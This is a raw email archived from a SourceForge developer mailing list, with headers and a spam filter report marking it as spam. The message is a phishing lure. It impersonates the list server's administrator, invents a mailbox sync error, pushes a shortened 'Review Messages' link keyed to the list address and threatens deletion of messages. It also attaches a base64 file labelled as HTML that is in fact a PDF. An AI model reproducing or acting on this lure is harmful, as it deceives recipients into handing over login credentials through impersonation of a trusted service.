Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id A7C5590325C
	for <lists+industrypack-devel@lfdr.de>; Tue, 11 Jun 2024 08:20:50 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sGusC-0000in-Re
	for lists+industrypack-devel@lfdr.de;
	Tue, 11 Jun 2024 06:20:49 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounce+cafb7c.deaaa2-industrypack-devel=lists.sourceforge.net@wealthsciences.com.au>)
 id 1sGusB-0000iU-2j for industrypack-devel@lists.sourceforge.net;
 Tue, 11 Jun 2024 06:20:47 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Type:MIME-Version:Message-ID:Date:
 To:From:Reply-To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=rHK0Ryx3N5PAEpo9Abj8TRxutqj4Vu31RThRRB6rNLc=; b=fecVuuRpNaHZVSMShd9PSXHB8X
 gpj+0JwGnrcytuL7J3Up/wO5hdT/pWxs50N1ArOA+GJn1gea7fMArmayNX/toP9WuW74Z2LyPnBCj
 gXrpt3LnY2PqBTQHWQIy3tgf/4JIc+1corLQy8igHeJ2+l2hkuaL5BCu2d5ZpFV+OhEo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Type:MIME-Version:Message-ID:Date:To:From:Reply-To:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=rHK0Ryx3N5PAEpo9Abj8TRxutqj4Vu31RThRRB6rNLc=; b=k
 MbirAdk2sQEeWJvhUjU1YOOps42DjpwdSCm/bn484f2XZqY8VXhMSmcBqVO/Dqo+fue/idjAMJzgQ
 Y4k/dzD0RgLYz+ThDRxmjc3aNKRu2+0OEt8ebXsWv14YxuyKO5xCbpuBPrXsPdAAdiONEwMZwU9+y
 6P2WRqk0/NK/3L6U=;
Received: from m42-3.mailgun.net ([69.72.42.3])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1sGusA-0002jb-Mw for industrypack-devel@lists.sourceforge.net;
 Tue, 11 Jun 2024 06:20:47 +0000
DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=wealthsciences.com.au;
 q=dns/txt; s=mx; t=1718086840; x=1718094040; 
 h=Content-Type: MIME-Version: Message-ID: Date: Subject: Subject: To: To:
 From: From: Reply-To: Sender: Sender; 
 bh=rHK0Ryx3N5PAEpo9Abj8TRxutqj4Vu31RThRRB6rNLc=;
 b=p79U/Dv8sCIC7pp2ScJpkOvj0bk8jr+RYbqAs1Imw15ddNYU29gcSoro7GiJRQrlfdRRwOLJmtmwgeOkcsJtNh5FOuq5fqWn5nZ3RcFoy8xMbyIWgsp/A6/GVdj5o4bfpjrkIPS/z/x1sto5jBgj5TKPxR3DfOedu5AcO9TMtC8=
X-Mailgun-Sending-Ip: 69.72.42.3
X-Mailgun-Sid: WyJhMDVkOCIsImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vmb3JnZS5uZXQiLCJkZWFhYTIiXQ==
Received: from vps2812079.trouble-free.net (vps2812079.trouble-free.net
 [205.209.99.224]) by eaa257419c4f with SMTP id 6667e6cb3f2dde0803f7a0b0
 (version=TLS1.3, cipher=TLS_AES_128_GCM_SHA256); Tue, 11 Jun 2024 05:55:23
 GMT
From: "lists.sourceforge.net Server  Info" <postmaster@wealthsciences.com.au>
To: industrypack-devel@lists.sourceforge.net
Date: 10 Jun 2024 22:55:22 -0700
Message-ID: <20240610225522.71AFD9180FE1A4FD@wealthsciences.com.au>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_4E2C17E4.80CE1508"
X-Spam-Score: 8.3 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Sync Messages. We noticed that your email :
 industrypack-devel@lists.sourceforge.net
 failed to sync messages to your inbox as of 6/10/2024 10:55:22 p.m... This
 is due to a server error on your mailbox. 
 Content analysis details:   (8.3 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: wealthsciences.com.au]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [69.72.42.3 listed in list.dnswl.org]
 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [69.72.42.3 listed in dnsbl-1.uceprotect.net]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [69.72.42.3 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [69.72.42.3 listed in sa-accredit.habeas.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_EXTRA_CLOSE       BODY: HTML contains far too many close tags
 1.2 HTML_OBFUSCATE_10_20   BODY: Message is 10% to 20% HTML
 obfuscation
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 2.5 MIXED_ES               Too many es are not es
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML
 tag
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
 0.7 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.0 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
 0.1 TO_IN_SUBJ             To address is in Subject
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1sGusA-0002jb-Mw
Subject: [Industrypack-devel] [SPAM] Error synchronizing message
 industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: "lists.sourceforge.net Server Info"
 <postmaster@wealthsciences.com.au>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_4E2C17E4.80CE1508
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><div class=3D"lightfont" style=3D"text-align: left; color: rgb(83, 82=
, 83); text-transform: none; text-indent: 0px; letter-spacing: normal; font=
-family: Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal;=
 font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wido=
ws: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-t=
ext-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-=
style: initial; text-decoration-color: initial;">
<h2 style=3D"margin: 0px 0px 10px; padding: 0px; text-align: left; color: i=
nherit; line-height: 1.45; font-family: Helvetica, Arial, sans-serif; font-=
size: 30px; font-weight: normal; overflow-wrap: normal;">Sync Messages.</h2=
><p style=3D"margin: 0px; padding: 0px; text-align: left; color: rgb(83, 82=
, 83); line-height: normal; font-family: Helvetica, Arial, sans-serif; font=
-size: 16px; font-weight: normal;">
We noticed that your email&nbsp;: industrypack-devel@lists.sourceforge.net&=
nbsp;&nbsp; failed to sync messages to your inbox as of<span>&nbsp;</span><=
font style=3D"vertical-align: inherit;">6/10/2024 10:55:22 p.m..</font>.</p=
>This is due to a server error on your mailbox.<p style=3D"margin: 0px; pad=
ding: 0px; text-align: left; color: rgb(0, 0, 0); line-height: normal; font=
-family: Helvetica, Arial, sans-serif; font-size: 16px; font-weight: normal=
;"><br>Review these messages and choose what happens to them.</p></div>
<div class=3D"lightfont" style=3D"text-align: left; color: rgb(83, 82, 83);=
 text-transform: none; text-indent: 0px; letter-spacing: normal; font-famil=
y: Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial; text-decoration-style:=
 initial; text-decoration-color: initial;">
&nbsp;</div><div style=3D"text-align: left; color: rgb(10, 10, 10); text-tr=
ansform: none; text-indent: 0px; letter-spacing: normal; font-family: Helve=
tica, Arial, sans-serif; font-size: 16px; font-style: normal; font-weight: =
400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
; text-decoration-color: initial;">
<a style=3D'margin: 0px; padding: 0px; width: 200px; text-align: center; co=
lor: rgb(255, 255, 255); line-height: 40px; font-family: "Helvetica Neue Li=
ght", Helvetica, sans-serif; font-weight: bold; text-decoration: none; disp=
lay: inline-block; background-color: rgb(61, 112, 178);' href=3D"https://to=
=2Elynck.it/76d04d#industrypack-devel@lists.sourceforge.net">Review Message=
s</a></div><p>
<span style=3D"text-align: left; color: rgb(10, 10, 10); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial=
, sans-serif; font-size: 16px; font-style: normal; font-weight: 400; word-s=
pacing: 0px; float: none; display: inline !important; white-space: normal; =
orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial;">&nbsp;</span></p>
<div class=3D"lightfont" style=3D"text-align: left; color: rgb(83, 82, 83);=
 text-transform: none; text-indent: 0px; letter-spacing: normal; font-famil=
y: Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
 font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial; text-decoration-style:=
 initial; text-decoration-color: initial;"></div><p>
<span style=3D"text-align: left; color: rgb(10, 10, 10); text-transform: no=
ne; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, Arial=
, sans-serif; font-size: 16px; font-style: normal; font-weight: 400; word-s=
pacing: 0px; float: none; display: inline !important; white-space: normal; =
orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial;">Messages older than 10 days will be remove=
d</span></p>
<p style=3D"margin: 0px; padding: 0px; text-align: left; color: rgb(0, 0, 0=
); text-transform: none; line-height: normal; text-indent: 0px; letter-spac=
ing: normal; font-family: Helvetica, Arial, sans-serif; font-size: 16px; fo=
nt-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal;=
 orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: =
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial;=20
text-decoration-color: initial;"><br><span class=3D"lightfont" style=3D"col=
or: rgb(83, 82, 83); font-size: 16px;">Thank you,</span><br><font style=3D"=
vertical-align: inherit;">lists.sourceforge.net</font><span>&nbsp;</span>Ad=
ministrator</p></body></html>
------=_NextPart_000_0012_4E2C17E4.80CE1508
Content-Type: text/html; name="Contract_document.html"; charset="utf-8"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Contract_document.html"

JVBERi0xLjcNCiXCtcK1wrXCtQ0KMSAwIG9iag0KPDwvVHlwZS9DYXRhbG9nL1BhZ2VzIDIg
MCBSL0xhbmcoZW4pIC9NZXRhZGF0YSAxOCAwIFIvVmlld2VyUHJlZmVyZW5jZXMgMTkgMCBS
Pj4NCmVuZG9iag0KMiAwIG9iag0KPDwvVHlwZS9QYWdlcy9Db3VudCAxL0tpZHNbIDMgMCBS
XSA+Pg0KZW5kb2JqDQozIDAgb2JqDQo8PC9UeXBlL1BhZ2UvUGFyZW50IDIgMCBSL1Jlc291
cmNlczw8L0V4dEdTdGF0ZTw8L0dTNSA1IDAgUi9HUzEwIDEwIDAgUj4+L1hPYmplY3Q8PC9J
bWFnZTYgNiAwIFI+Pi9Gb250PDwvRjEgOCAwIFIvRjIgMTEgMCBSPj4vUHJvY1NldFsvUERG
L1RleHQvSW1hZ2VCL0ltYWdlQy9JbWFnZUldID4+L0Fubm90c1sgMTMgMCBSIDE0IDAgUl0g
L01lZGlhQm94WyAwIDAgNTk0Ljk2IDg1MC4zMl0gL0NvbnRlbnRzIDQgMCBSL0dyb3VwPDwv
VHlwZS9Hcm91cC9TL1RyYW5zcGFyZW5jeS9DUy9EZXZpY2VSR0I+Pi9UYWJzL1M+Pg0KZW5k
b2JqDQo0IDAgb2JqDQo8PC9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDg5Mj4+DQpzdHJl
YW0NCnjFk8K94oSiS28xw4fDryvDrXcwN8Ojw7HDm0fCoMK04oCawq/DgCEk4oC64oKsaMKz
bVJaw6XDm8Ojw7HCpknigLBUw4RmesKwwrzCs8Ojw7nCj3/DnuKEosK2wrt1wqXLnOKAmSrD
v3hQw4Yx4oCUwqxMxb5FwqfCpMORbMORw5TDleKAlMKnbF5Xw49PPjk2W8OWwrBZXQ0K4oC5
UuKAocOsw63CpHUsWi3igKIrw57Dk8KndcO1wqHCri7CvOKAk8OBwrHDrMOMbGTDoCTCsMaS
w5TFocKNw4/CssOq4oC6wrPDkcKsw7HDrMKoZcOrwqAlwqTFoMORw7vCvGJfw5DigJTDg8K8
w7RoNsWTYsOKw4fDoOKAnHTigJMNCsOPMMK9WcOZwqjCsi3DhU7DqsOqK2fDojvCvsKtwqvD
l8ODw402w75BUTMgwqnDrFFwLMK4IOKAosOfwqrCrsK1XsOLJ8KtMMO8R+KAnCbigJNPcTjF
vcKP4oCTP29sw6fCp8OCw7PDkcKqYMO5QsOWw5Zfw5lpKSDCusKrM8K0b0xLxZPDjWfDouKA
k8OrxZPCrcOaPzrDi8K4YMK6RcOnf8Kyw5slwrRtw5pb4oCUxb7Ct8KdW8OfcHQwMuKAnn3i
gqzDkMOSwqbDnXpswqAky5zDiOKAoMOjwq/CvMKdw7Yvwr3DtEDCuMOV4oCdXcONPsK9w4nC
p8Ouw5zFuMO0wq5tw4DDisKwd8Kvw79XY8K7wqrDmmbCtMK6Z8KdfcK1bMKsw5TDt3TigJ1r
wqzCvcOO4oCmMsOHam1HwrlaJsOsdMK0wqnCrcOlZS7CqsOAwq/CtkVWxaDCtMKd4oC5dX1N
w4vDvcObLSHFuMOPwr/DtMOfOcK24oCYw4rDlcKq4oCdw6zCtsW+w6/DlsO8w6bDsMORXcOi
wqw4wqE+SsOda8Ozw41GMMOpK8OsMQ0KZsKwesK2WTnDhmV4d8O8wrtc4oCUxb52ekPCusOc
dOKAokxkw5TDtiFAw5tidjPDu1jFvcOowrPDqMOSb8K64oCecjLDpcOQw4bLhsKpYGnDpmXi
gJTDq+KAusOvcCjCp1nDuiduR8O2xbjCt8ORMj0iw7fDnkvDhsOHwrTDqzHDrl8nJOKEosOn
w7A6w7nCu8OuwrvDrMOScUTDnCw3Q8OETXHGksOMw43DqMKowqzigJzCr8OjUsOmZnQiDQo3
y4bCuHkibsW9y4bigLolw6Jmy4bCuGkibkDDhE3DkXDCs+KAsOKAoOKAusKNNMOcbCDDosOm
4oCwwrhhPzrCuWggw5DDicO9ICjDjkdxIm7FoOKAoOKAukk0w5xMwqTDoWY3T8OEw41xwrNE
w5w3TcOEDQrLhsK4YT/CsOKAocOXw5HigLDDpsO/RsKNf8OIImzFvuKAusKjw4Fm4oCwwrAi
bMWhYVM0w5gg4oCYYMaSSMaSDQrLhsOeJeKAmsKnw4HDpsuGwrBhMyB4w7XCuSjFoMOjw4Fm
QMOww4rigqzLhuKAusKiw6HigJNowrBFasKBxaHCp8KBw6ZowqBZaOKAoMWhJsKqT2jCrnzD
rMO5wrbigJk2w57Dn8W9dMOmIcK1w7diNW/igKbDs8O8WnTDoA0KTiLFoW42SMO4w6VWR8O+
DQor4oCTw500w7DCoSAgw77CqsKsw6nigJrigKLDuXHCscKvwp3CvnHDlMK+PUp34oCww4PD
uMK8y5xgw6wpWsOKwr3CtsKz4oCTPGZ4w6vigLrDqOKAukhEw67Cu8Khw5zCo8O/w6HDsX0N
CmVuZHN0cmVhbQ0KZW5kb2JqDQo1IDAgb2JqDQo8PC9UeXBlL0V4dEdTdGF0ZS9CTS9Ob3Jt
YWwvY2EgMT4+DQplbmRvYmoNCjYgMCBvYmoNCjw8L1R5cGUvWE9iamVjdC9TdWJ0eXBlL0lt
YWdlL1dpZHRoIDIxNy9IZWlnaHQgNjQvQ29sb3JTcGFjZS9EZXZpY2VSR0IvQml0c1BlckNv
bXBvbmVudCA4L0ZpbHRlci9EQ1REZWNvZGUvSW50ZXJwb2xhdGUgdHJ1ZS9TTWFzayA3IDAg
Ui9MZW5ndGggNDU3NT4+DQpzdHJlYW0NCsO/w5jDv8OgIEpGSUYgIMOwIMOwICDDv8OhIFpF
eGlmICBNTSAqICAgICAgICAgICBKICAgICAgICBRICAgICAgIFEgICAgICAkw6hRICAgICAg
JMOoICAgICDigKDCoCAgwrHCj8O/w5sgQyANCgkNCg0KDQohKCEwKjIxLyouLTQ7S0A0OEc5
LS5CWUJHTlBUVVQzP11jXFJiS1NUUcO/w5sgQycnUTYuNlFRUVFRUVFRUVFRUVFRUVFRUVFR
UVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRw7/DgCAgQCDDmSIgw7/DhCAgICAgICAg
ICAgCQ0Kw7/DhCDCtSAgIH0gITFBUWEicTLCgeKAmMKhI0LCscOBUsORw7AkM2Jy4oCaCQ0K
JSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6xpLigJ7igKbi
gKDigKHLhuKAsMWg4oCZ4oCc4oCd4oCi4oCT4oCUy5zihKLFocKiwqPCpMKlwqbCp8KowqnC
qsKywrPCtMK1wrbCt8K4wrnCusOCw4PDhMOFw4bDh8OIw4nDisOSw5PDlMOVw5bDl8OYw5nD
msOhw6LDo8Okw6XDpsOnw6jDqcOqw7HDssOzw7TDtcO2w7fDuMO5w7rDv8OEICAgICAgICAJ
DQrDv8OEIMK1ICB3ICExQVFhcSIywoFC4oCYwqHCscOBCSMzUsOwYnLDkQ0KJDTDoSXDsSYn
KCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXrigJrGkuKAnuKApuKA
oOKAocuG4oCwxaDigJnigJzigJ3igKLigJPigJTLnOKEosWhwqLCo8KkwqXCpsKnwqjCqcKq
wrLCs8K0wrXCtsK3wrjCucK6w4LDg8OEw4XDhsOHw4jDicOKw5LDk8OUw5XDlsOXw5jDmcOa
w6LDo8Okw6XDpsOnw6jDqcOqw7LDs8O0w7XDtsO3w7jDucO6w7/DmiAgID8gw7MNCsK7wqTD
m0s9w6xvw41u4oCYSOKApsOuwqxcw73DpcKww6ogw6TDoMOjwqVSwq7GkkzCuOKAosO/IF8m
Lytuw7kNCsK8wpBBw5wvxpLCsXPDt0AgbFtSX8K1w587TyzDmOKAmMK34oKscCDDoCAz4oKs
ccOa4oSiw7Y/w7nDtsKPw77DucKnw5nDvyDDh+KAnT/DtcONf8KQwqnDq8OEwp1Jw7M9T8Ky
wqNCxaHCp3VsVcO+w4/Cs8O/IMW4aMK/w6/FoVXCscK1RsKQIsKwOcKjYirDhcW4wrTigJRz
X2NLw7lR4oSiwqjDnmrDiSTDluKAk+KAlMOXIW4NCkshZi5Zw5dYU+KAmsOBw7LCoGR1w4LD
p+KCrE1zN8K3wrc64oCmw4tcw53DjMOTTsOKwqrDkjdSQsWSw7rFk8OPesOrNcO3w5PDrMOu
w6VFLFnDoELigJ7DvMW94oC6wpDDozLCkMOgxpLDhXPDmsOSw4lxwq1cwo3FvkV5VcOJYsKo
N8K5w4fCrsO1NcOtUW3Dk03FuCPigLnFoOKApmlGK0MyxaAowq1OYMKixaAoIMKixaAoIMKi
xaDDqsK0dcKNOmluwq48wq0/SCknw5nDjGDihKLihKLDvsO4LsK7T8OMUCBOSMOc4oC6DQon
J2RDwqd4e8OswrfDjnXCpsWg4oC5cMOyw5laUSMwNjLDp8Kdw5zigKDDoMKhDQrFvTNuw4NP
w7DDpDfDrzXDtHfigJRw4oCTw4pDy4bigJhBw4/Dp2YgZGPDpjnDjVjCvXt4w6PFvcOmw750
a8Kpw5lSKGRYw4ovLE5WJA0KRjI6Y8K2TT5bSyjCsj3CpsKoUVpMS8Ouw5zCu+KAmm7DmMK4
fuKEolxg4oCZICTDpCUqwo1dLVbCneKApkldw74tX0bCs+KAk8OOw7tYOsOVw4XDnsOdwqR5
wqhecMOZICPFvcucw4bDn8OebiBjSSLCueKAusKrw4vigLrCtcKBbmZpRcK8QsK3dVTCkMK5
w7Q/w4vCoMOSw5vDjcOkw4nCu+KAosKBSXHDkMWSMuKAmT1Hw4/DqsOWwqZqc8OZwrtvw7LD
m8Olfj51IyrDmMOjIMaSxb3DmcKqwqVTwp1qYcW9w4J9WkvigKLDnTLCnVFaxZNFUEVQRXTD
l1olwqXigKLDqcK0wrjDmsOtb8KPIMK7wrZCw6TFk8OgNzHigqwww6TDlk/DmG3Cv8Onw6J/
w7vDsD/DuMKqIH3DjDp94oCdw6ZL4oCww4g/NyImw7HDvcOhw4jDtMOPY8W+SCHDlcOtUMKk
cUUtwrRjwp3DpjhnZSFAQUXDgTtXJyDDt8Okw5Z+wqZzdMK/w7XDgsO9wrVS4oKsNsKiwrrC
vHjigqzCtcOUwqFgwqpP4oCUIcKy4oKscD7DtsW+w7jFuMOWwoFzwq7DvcKdblw7ZWVOOGxj
wq1iw5d1w6HDvcObbHfFoUfigJzCqlzDm8KyO8OKTOKAucOlSMOhwrY8KcOHwrtkwr3CucWT
wqHCq0dVOsK1wqbDlFTDrcOzOcOYL3XCq+KAk8OFwrjFoWPDqVvCj8OoKDfDusWTbETDtwlJ
PMK3IFvFk8OlccK7wrfCpXo1w4rDuOKAoVXDruKAomVwQGDCjTXCrkx5w67Cu8KBIMOwO3bC
rifDhMO+wrfDk8Kjxb7DpsOfUXPCpMKgw5xbw4PDi2zCsMODOnzigqzigKB2w6F+4oCawqYx
wqctwqPDuFZVw6lvO8O6O8Wgwr5sdl9JwqlaXEHCuVTigKDCjSRXYMKq4oKsw4rDjMKNw7fD
gMOcxaA6w7zDmMOGaE9xwqbDnMOKw5LCvMK7R8Oyw6Z0w4PDjsOY4oCmxb3DpsOBIOKAmSAk
ZA0Kw4XCosK1SsOaI8W9UnJ3ZsKmwq1raTDDnVrCrOKAmMKsw4B8wrvigKLDk3fDnmDCpzkg
xZJgw6TDpMKwLHbDs07DlsOKe8K9w4YlQMKpwo3DjyTigLnigJpzwoHCucuGODx1w6DDulTD
t3/DsgnDk8O/IMOtwqfDvuKAplXDrTLDkjQjccOz4oCdwqZDesKow6nDs8OIw63FuMKlMcOl
xZPDtlLCrHfCsuKAoVLCrFlPcMOAwpBHw5PCuCPCtSzDllPDgW7igJzDilXDscK1TOKAucK/
ZOKEosOcw6TFknI9RUnDtnN0LGPCtsK3YSTCv8K5LE7igJluPcOPw6Vk4oCUwq1Yw7nGklw/
4oSiLDZXMTxxw4kow5xZY8ODIsO2w6coxpI+w7RWw5rDlmvDiMWgw4NKI2zCtMOSSCPFveKA
kyF/4oCewpA6xb56w6PigKFPZyTDuMKdYuKAsMOVw4jCsS0nw4rDisOtw4Ezwr/igJpHR1vC
ozTCjcKnROKAmsOif8W44oCaSmx44oKsOmJDw5PDkMOVw4tYw4XDqsOBwrpjbcO24oC5w4dY
wqPigKDDnVlRxb3DjMOh4oC5bsOAw4rDoHPFknrDkE1VxbhEw5XCocOUbeKAmTfFocObVkBK
xZPCqVPFk8OYw5dFw6HCq1DigJMwWuKEokldUlt3dVEkw5HDo8Of4oCiwrItY8WgSyjCr8Ku
wqZPwrVcXUjigJppwqMyDQrDg8OLbcOOS2DCj+KAusWTwqtww43Fk8Ox4oC5XUvCpcOOw7MJ
bsKNwrTCsirCpMOBCT5axZIpxb1GDQp3LMKjK8KBw4EhdsKmwq7CrGlKfsOOamYlw6XDncOF
w73DnOKAlFdSwrTCs8OIcsOOw53DvyDDgHbDh2rigJrCrV5pw7dWIibFvljCpl3DkUvCtMOs
4oCYcFTDt8Ogwo/CpnnDgcKow61twqfCvMK5S3t4w4zigJnCv0XihKI+w4BJw6wp4oSiw652
XiDCgW3CtcOrw6jigJxEwqxGIMOPOMO8M8Wgw4vDsSbigJh9w73CtzLDiSXCtmNIwqLDi8OM
4oCYdOKAoD4ww63igJzigqxHPcOPwqdBwqU1w4x3OuKAosOmwqtw4oCmwq3Co2bCuHU9w4Z+
VDxuJVc9wrPDrVh6wrXDnMO6wp3FknrCjcOLbsWhw6LDtsOgwrckwoHDssOF4oKsMk8gw5hc
w7RWwq5Hwq/ihKJPw53igKY3wrpa4oCdw6TDksKuw5Nmw5HDjMOtwrFSy4bDpXJ/w51GJ8K3
wqVDa2ctw57DrynCoV3CuMOP4oC6OkfDuW4jP+KApl0pbzXCncOSwrTigJPCryTDueKAmMOL
DQrCsj5iwqbDgiDFksOdM8OIw4nDoMKBDQrDieKAk3jCp8K6wrhMTcK6IE7DnGcow4cnw5TF
k098w6bCuiBswrpdw4xRNOKApsOtWA0KwrHDnUTDrHnDhw0KwqxJw7xU4oCZN8WgRsWgVGTi
gJgJVlYqR1BFXMK44oCTwq9kxZLDm+KAsH934oCaw5hhxZJk4oCaIMOnxpLCjcOAw6ByecKn
PFE0N3HihKLDlMO94oC6w7figJhII8OHxZMqw6PFk2DigKDDqcaSw4c8IEfCusaSJcKQI8O+
xbjCocO/IMOiw6rCvcOVxZPCtuKAunzDluKApsK3Z1TDqSfDp8K0xZN+NX5ra8Kmw5Yvw6PC
ssK2a+KAsGc04oCmw5xyccaSw63Dj8K9R3bigJQ24oCTL8O2xaFg4oCTZ8KPJcKxxZLCkDrD
oMOkYzDDsk8hcHx4xb1YdMucbcOh4oCTNuKAmSTDm8K8IMOJw7k3w75CMj/LhsK2CWxuw6M3
w7tzWMO/IMKgwrXDr8O+P8O4w5Z9b1PDvyDCj8Kkw78gwq7DvyDDqMK1wq1fwrHDmMOpb27D
t8ONw7PDoMW9VsWSbcKQwqZTeMOIIHBbZ3VgN8KvIOKAoDVvbF5LwrZGLcOmeVHDh27CscKu
w78gPcOGw4TDmsKlfeKAsGB7xZJ/eFbigJ5Rw7nDl8K3floqxbg9w4bDlQ0Kw6DDmFROfOKA
mMK7OnDCtD7CsVPigJnDtjPDvMOtP8O7wq3DvyDigqzGksO/IMW9VMO2esWTVuKEomzDri4t
wqQrwrTCvDBsJHpkS8OTwoFaxpJPf8OvKMO8w6l/wrPDm8O+esOKwrnCvsK3w5TDvsOGf8OP
w7hufEE1w5wNCsOWwqV9PC3CjcORw4jFksOKcHIywr7CosKow7nDmn/Dt1vDvyDDvyDCrcOf
w6zDs8O/ID3DpUhsdHU/y5zCpcO1wrjigKHDtjPDvn/DgMOJW8KrN8K0a184w4bCuS7igKbC
